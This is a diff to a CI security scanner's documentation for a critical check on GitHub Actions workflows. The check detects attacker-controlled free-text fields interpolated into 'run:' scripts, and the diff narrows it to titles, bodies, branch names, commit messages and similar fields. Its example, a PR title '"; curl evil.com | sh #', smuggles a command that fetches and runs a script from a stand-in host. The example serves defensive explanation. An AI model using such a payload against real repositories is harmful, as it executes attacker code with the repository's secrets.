@@ -532,12 +532,31 @@ dependency.
 
 **Severity:** `critical` • **Control:** `workflowMustNotInjectUserInputInScripts`
 
-A `run:` shell script interpolates `${{ github.event.* }}`,
-`${{ github.head_ref }}` or `${{ github.pull_request.* }}` directly.
-Under a privileged trigger (`pull_request_target`, `workflow_run`)
-those expressions carry PR-author-controlled values; a title crafted
-as `"; curl evil.com | sh #` becomes a shell command with the base
-repo's secrets.
+A `run:` shell script interpolates an attacker-controlled **free-text**
+`github` field directly. The expression value is pasted in by GitHub
+**before** the shell parses the command, so a PR title crafted as
+`"; curl evil.com | sh #` becomes a shell command with the base repo's
+secrets.
+
+The check fires only on the genuinely injectable subfields — the ones a
+PR author, issue/comment author, or fork owner controls as free text:
+
+- titles and bodies (`*.title`, `*.body` on issue / pull_request /
+  comment / review / discussion)
+- branch / ref names (`github.head_ref`, `head.ref`, `head.label`,
+  `head_branch`, `default_branch`)
+- commit messages (`*.message`)
+- repository metadata on the attacker's fork (`*.description`,
+  `*.homepage`)
+- author / committer identity (`author.name`, `author.email`,
+  `committer.name`, `committer.email`)
+- GitHub Pages page names (`page_name`)
+
+Numeric, boolean, enum and SHA fields (`pull_request.number`,
+`*.commits`, `head.repo.fork`, `event_name`, `author_association`,
+`*.sha`, `github.repository`) are deliberately **not** flagged — they
+cannot carry an injection payload, and flagging them drowns the real
+signal in false positives.
 
 ```yaml
 # ❌ before — PR title is pasted straight into the shell
